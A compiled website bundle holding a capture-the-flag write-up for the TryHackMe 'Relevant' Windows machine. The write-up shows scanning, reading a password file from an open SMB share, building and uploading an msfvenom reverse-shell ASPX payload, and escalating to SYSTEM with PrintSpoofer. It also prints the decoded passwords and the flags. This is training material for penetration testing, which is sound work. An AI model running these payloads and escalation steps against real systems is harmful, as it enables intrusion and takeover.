"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[3928],{3905:(e,t,n)=>{n.d(t,{Zo:()=>c,kt:()=>k});var r=n(67294);function o(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function s(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function a(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?s(Object(n),!0).forEach((function(t){o(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):s(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function i(e,t){if(null==e)return{};var n,r,o=function(e,t){if(null==e)return{};var n,r,o={},s=Object.keys(e);for(r=0;r<s.length;r++)n=s[r],t.indexOf(n)>=0||(o[n]=e[n]);return o}(e,t);if(Object.getOwnPropertySymbols){var s=Object.getOwnPropertySymbols(e);for(r=0;r<s.length;r++)n=s[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(o[n]=e[n])}return o}var l=r.createContext({}),p=function(e){var t=r.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):a(a({},t),e)),n},c=function(e){var t=p(e.components);return r.createElement(l.Provider,{value:t},e.children)},d="mdxType",m={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},u=r.forwardRef((function(e,t){var n=e.components,o=e.mdxType,s=e.originalType,l=e.parentName,c=i(e,["components","mdxType","originalType","parentName"]),d=p(n),u=o,k=d["".concat(l,".").concat(u)]||d[u]||m[u]||s;return n?r.createElement(k,a(a({ref:t},c),{},{components:n})):r.createElement(k,a({ref:t},c))}));function k(e,t){var n=arguments,o=t&&t.mdxType;if("string"==typeof e||o){var s=n.length,a=new Array(s);a[0]=u;var i={};for(var l in t)hasOwnProperty.call(t,l)&&(i[l]=t[l]);i.originalType=e,i[d]="string"==typeof e?e:o,a[1]=i;for(var p=2;p<s;p++)a[p]=n[p];return r.createElement.apply(null,a)}return r.createElement.apply(null,n)}u.displayName="MDXCreateElement"},47995:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>l,contentTitle:()=>a,default:()=>m,frontMatter:()=>s,metadata:()=>i,toc:()=>p});var r=n(87462),o=(n(67294),n(3905));const s={},a="Relevant",i={unversionedId:"Tryhackme/Relevant/Relevent",id:"Tryhackme/Relevant/Relevent",title:"Relevant",description:"Penetration Testing Challenge",source:"@site/writeups/Tryhackme/Relevant/Relevent.md",sourceDirName:"Tryhackme/Relevant",slug:"/Tryhackme/Relevant/Relevent",permalink:"/writeups/Tryhackme/Relevant/Relevent",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Recovery",permalink:"/writeups/Tryhackme/Recovery/"},next:{title:"Res",permalink:"/writeups/Tryhackme/Res/"}},l={},p=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Pre-Engagement Briefing",id:"task-1-pre-engagement-briefing",level:2}],c={toc:p},d="wrapper";function m(e){let{components:t,...n}=e;return(0,o.kt)(d,(0,r.Z)({},c,n,{components:t,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"relevant"},"Relevant"),(0,o.kt)("p",null,"Penetration Testing Challenge"),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/relevant"},"Relevant")),(0,o.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,o.kt)("li",{parentName:"ul"},"SMB Enumeration"),(0,o.kt)("li",{parentName:"ul"},"Cryptography",(0,o.kt)("ul",{parentName:"li"},(0,o.kt)("li",{parentName:"ul"},"Base64"))),(0,o.kt)("li",{parentName:"ul"},"Security Misconfiguration"),(0,o.kt)("li",{parentName:"ul"},"msfvenom (Aspx)"),(0,o.kt)("li",{parentName:"ul"},"Abusing Impersonation Privileges (PrintSpoofer)")),(0,o.kt)("hr",null),(0,o.kt)("h2",{id:"task-1-pre-engagement-briefing"},"Task 1 Pre-Engagement Briefing"),(0,o.kt)("p",null,"You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in seven days."),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Scope of Work")),(0,o.kt)("p",null,"The client requests that an engineer conducts an assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test). The client has asked that you secure two flags (no location provided) as proof of exploitation:"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"User.txt"),(0,o.kt)("li",{parentName:"ul"},"Root.txt")),(0,o.kt)("p",null,"Additionally, the client has provided the following scope allowances:"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"Any tools or techniques are permitted in this engagement, however we ask that you attempt manual exploitation first"),(0,o.kt)("li",{parentName:"ul"},"Locate and note all vulnerabilities found"),(0,o.kt)("li",{parentName:"ul"},"Submit the flags discovered to the dashboard"),(0,o.kt)("li",{parentName:"ul"},"Only the IP address assigned to your machine is in scope"),(0,o.kt)("li",{parentName:"ul"},"Find and report ALL vulnerabilities (yes, there is more than one path to root)")),(0,o.kt)("p",null,"(Roleplay off)"),(0,o.kt)("p",null,"I encourage you to approach this challenge as an actual penetration test. Consider writing a report, to include an executive summary, vulnerability and exploitation assessment, and remediation suggestions, as this will benefit you in preparation for the eLearnSecurity Certified Professional Penetration Tester or career as a penetration tester in the field."),(0,o.kt)("p",null,"Note - Nothing in this room requires Metasploit"),(0,o.kt)("p",null,"Machine may take up to 5 minutes for all services to start."),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Please do not stream this room for the first 7 days of it's release (August 21, 2020).")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Relevant$ sudo nmap -p- -sS -sC -sV -O 10.10.9.11\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-14 21:31 CEST\nNmap scan report for 10.10.9.11\nHost is up (0.063s latency).\nNot shown: 65527 filtered ports\nPORT      STATE SERVICE       VERSION\n80/tcp    open  http          Microsoft IIS httpd 10.0\n| http-methods:\n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: IIS Windows Server\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds\n3389/tcp  open  ms-wbt-server Microsoft Terminal Services\n| rdp-ntlm-info:\n|   Target_Name: RELEVANT\n|   NetBIOS_Domain_Name: RELEVANT\n|   NetBIOS_Computer_Name: RELEVANT\n|   DNS_Domain_Name: Relevant\n|   DNS_Computer_Name: Relevant\n|   Product_Version: 10.0.14393\n|_  System_Time: 2020-10-14T19:34:20+00:00\n| ssl-cert: Subject: commonName=Relevant\n| Not valid before: 2020-07-24T23:16:08\n|_Not valid after:  2021-01-23T23:16:08\n|_ssl-date: 2020-10-14T19:35:00+00:00; 0s from scanner time.\n49663/tcp open  http          Microsoft IIS httpd 10.0\n| http-methods:\n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: IIS Windows Server\n49666/tcp open  msrpc         Microsoft Windows RPC\n49668/tcp open  msrpc         Microsoft Windows RPC\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2016|2012|2008|10 (91%)\nOS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_10:1607\nAggressive OS guesses: Microsoft Windows Server 2016 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows 10 1607 (85%)\nNo exact OS matches for host (test conditions non-ideal).\nService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: 1h24m00s, deviation: 3h07m50s, median: 0s\n| smb-os-discovery:\n|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)\n|   Computer name: Relevant\n|   NetBIOS computer name: RELEVANT\\x00\n|   Workgroup: WORKGROUP\\x00\n|_  System time: 2020-10-14T12:34:20-07:00\n| smb-security-mode:\n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-security-mode:\n|   2.02:\n|_    Message signing enabled but not required\n| smb2-time:\n|   date: 2020-10-14T19:34:24\n|_  start_date: 2020-10-14T19:29:46\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 211.45 seconds\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/Relevant$ smbclient -L //10.10.9.11\nEnter WORKGROUP\\kali\'s password:\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        nt4wrksv        Disk\nSMB1 disabled -- no workgroup available\nkali@kali:~/CTFs/tryhackme/Relevant$ smbclient //10.10.9.11/nt4wrksv\nEnter WORKGROUP\\kali\'s password:\nTry "help" to get a list of possible commands.\nsmb: \\> ls\n  .                                   D        0  Sat Jul 25 23:46:04 2020\n  ..                                  D        0  Sat Jul 25 23:46:04 2020\n  passwords.txt                       A       98  Sat Jul 25 17:15:33 2020\n\n                7735807 blocks of size 4096. 4950835 blocks available\nsmb: \\> get passwords.txt\ngetting file \\passwords.txt of size 98 as passwords.txt (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)\nsmb: \\> exit\nkali@kali:~/CTFs/tryhackme/Relevant$ cat passwords.txt\n[User Passwords - Encoded]\nQm9iIC0gIVBAJCRXMHJEITEyMw==\nQmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk\n\nkali@kali:~/CTFs/tryhackme/Relevant$ echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d\nBob - !P@$$W0rD!123\n\nkali@kali:~/CTFs/tryhackme/Relevant$ echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d\nBill - Juw4nnaM4n420696969!$$$\n')),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"Bob:!P@$$W0rD!123")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"Bill:Juw4nnaM4n420696969!$$$")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/Relevant$ msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.8.106.222 lport=4444 -f aspx -o shell.aspx\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 201283 bytes\nFinal size of aspx file: 1015556 bytes\nSaved as: shell.aspx\nkali@kali:~/CTFs/tryhackme/Relevant$ smbclient //msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.8.50.72 lport=4444 -f aspx -o shell.aspx^C\nkali@kali:~/CTFs/tryhackme/Relevant$ smbclient //10.10.9.11/nt4wrksv\nEnter WORKGROUP\\kali\'s password:\nTry "help" to get a list of possible commands.\nsmb: \\> put shell.aspx\nputting file shell.aspx as \\shell.aspx (798.5 kb/s) (average 798.5 kb/s)\nsmb: \\> ls\n  .                                   D        0  Wed Oct 14 21:42:49 2020\n  ..                                  D        0  Wed Oct 14 21:42:49 2020\n  passwords.txt                       A       98  Sat Jul 25 17:15:33 2020\n  shell.aspx                          A  1015556  Wed Oct 14 21:42:50 2020\n\n                7735807 blocks of size 4096. 4935058 blocks available\nsmb: \\>\n')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Relevant$ msfconsole -q\n[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp\nmsf5 exploit(windows/smb/ms17_010_eternalblue) > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf5 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_tcp\npayload => windows/x64/meterpreter_reverse_tcp\nmsf5 exploit(multi/handler) > set lhost 10.8.106.222\nlhost => 10.8.106.222\nmsf5 exploit(multi/handler) > set lport 4444\nlport => 4444\nmsf5 exploit(multi/handler) > run\n\n[*] Started reverse TCP handler on 10.8.106.222:4444\n[*] Meterpreter session 1 opened (10.8.106.222:4444 -> 10.10.9.11:49873) at 2020-10-14 21:52:05 +0200\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"meterpreter > getuid\nServer username: IIS APPPOOL\\DefaultAppPool\nmeterpreter > cd c:/users\nmeterpreter > dir\nListing: c:\\users\n=================\n\nMode              Size  Type  Last modified              Name\n----              ----  ----  -------------              ----\n40777/rwxrwxrwx   0     dir   2020-07-25 17:05:52 +0200  .NET v4.5\n40777/rwxrwxrwx   0     dir   2020-07-25 17:05:49 +0200  .NET v4.5 Classic\n40777/rwxrwxrwx   0     dir   2020-07-25 16:57:31 +0200  Administrator\n40777/rwxrwxrwx   0     dir   2016-07-16 15:34:35 +0200  All Users\n40777/rwxrwxrwx   0     dir   2020-07-25 17:21:26 +0200  Bob\n40555/r-xr-xr-x   0     dir   2016-07-16 08:04:24 +0200  Default\n40777/rwxrwxrwx   0     dir   2016-07-16 15:34:35 +0200  Default User\n40555/r-xr-xr-x   0     dir   2016-07-16 15:23:21 +0200  Public\n100666/rw-rw-rw-  174   fil   2016-07-16 15:23:24 +0200  desktop.ini\n\nmeterpreter > cd c:/users/Bob/Desktop\nmeterpreter > dir\nListing: c:\\users\\Bob\\Desktop\n=============================\n\nMode              Size  Type  Last modified              Name\n----              ----  ----  -------------              ----\n100666/rw-rw-rw-  35    fil   2020-07-25 17:23:52 +0200  user.txt\n\nmeterpreter > cat user.txt\nTHM{fdk4ka34vk346ksxfr21tg789ktf45}\n")),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://github.com/itm4n/PrintSpoofer"},"PrintSpoofer")),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/"},"PrintSpoofer - Abusing Impersonation Privileges on Windows 10 and Server 2019")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/Relevant$ smbclient //10.10.9.11/nt4wrksv\nEnter WORKGROUP\\kali\'s password:\nTry "help" to get a list of possible commands.\nsmb: \\> pwd\nCurrent directory is \\\\10.10.9.11\\nt4wrksv\\\nsmb: \\> ls\n  .                                   D        0  Wed Oct 14 21:42:49 2020\n  ..                                  D        0  Wed Oct 14 21:42:49 2020\n  passwords.txt                       A       98  Sat Jul 25 17:15:33 2020\n  shell.aspx                          A  1015556  Wed Oct 14 21:42:50 2020\n\n                7735807 blocks of size 4096. 5135045 blocks available\nsmb: \\> put PrintSpoofer.exe\nputting file PrintSpoofer.exe as \\PrintSpoofer.exe (22.4 kb/s) (average 22.4 kb/s)\nsmb: \\> ls\n  .                                   D        0  Wed Oct 14 22:08:03 2020\n  ..                                  D        0  Wed Oct 14 22:08:03 2020\n  passwords.txt                       A       98  Sat Jul 25 17:15:33 2020\n  PrintSpoofer.exe                    A    27136  Wed Oct 14 22:08:04 2020\n  shell.aspx                          A  1015556  Wed Oct 14 21:42:50 2020\n\n                7735807 blocks of size 4096. 5135038 blocks available\nsmb: \\> exit\n')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"c:\\users\\Bob\\Desktop>cd C:\\\ncd C:\\\n\nC:\\>cd \\inetpub\\wwwroot\\nt4wrksv\ncd \\inetpub\\wwwroot\\nt4wrksv\n\nC:\\inetpub\\wwwroot\\nt4wrksv>ls\nls\n'ls' is not recognized as an internal or external command,\noperable program or batch file.\n\nC:\\inetpub\\wwwroot\\nt4wrksv>dir\ndir\n Volume in drive C has no label.\n Volume Serial Number is AC3C-5CB5\n\n Directory of C:\\inetpub\\wwwroot\\nt4wrksv\n\n10/14/2020  01:08 PM    <DIR>          .\n10/14/2020  01:08 PM    <DIR>          ..\n07/25/2020  08:15 AM                98 passwords.txt\n10/14/2020  01:08 PM            27,136 PrintSpoofer.exe\n10/14/2020  12:42 PM         1,015,556 shell.aspx\n               3 File(s)      1,042,790 bytes\n               2 Dir(s)  21,033,115,648 bytes free\n\nC:\\inetpub\\wwwroot\\nt4wrksv>PrintSpoofer.exe -i -c powershell.exe\nPrintSpoofer.exe -i -c powershell.exe\n[+] Found privilege: SeImpersonatePrivilege\n[+] Named pipe listening...\n[+] CreateProcessAsUser() OK\nWindows PowerShell\nCopyright (C) 2016 Microsoft Corporation. All rights reserved.\n\nPS C:\\Windows\\system32> whoami\nwhoami\nnt authority\\system\nPS C:\\Windows\\system32> cd \\users\\administrator\\desktop\ncd \\users\\administrator\\desktop\nPS C:\\users\\administrator\\desktop> dir\ndir\n\n\n    Directory: C:\\users\\administrator\\desktop\n\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-a----        7/25/2020   8:25 AM             35 root.txt\n\n\nPS C:\\users\\administrator\\desktop> type root.txt\ntype root.txt\nTHM{1fk5kf469devly1gl320zafgl345pv}\n")),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"User Flag")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"THM{fdk4ka34vk346ksxfr21tg789ktf45}")),(0,o.kt)("ol",{start:2},(0,o.kt)("li",{parentName:"ol"},"Root Flag")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"THM{1fk5kf469devly1gl320zafgl345pv}")))}m.isMDXComponent=!0}}]);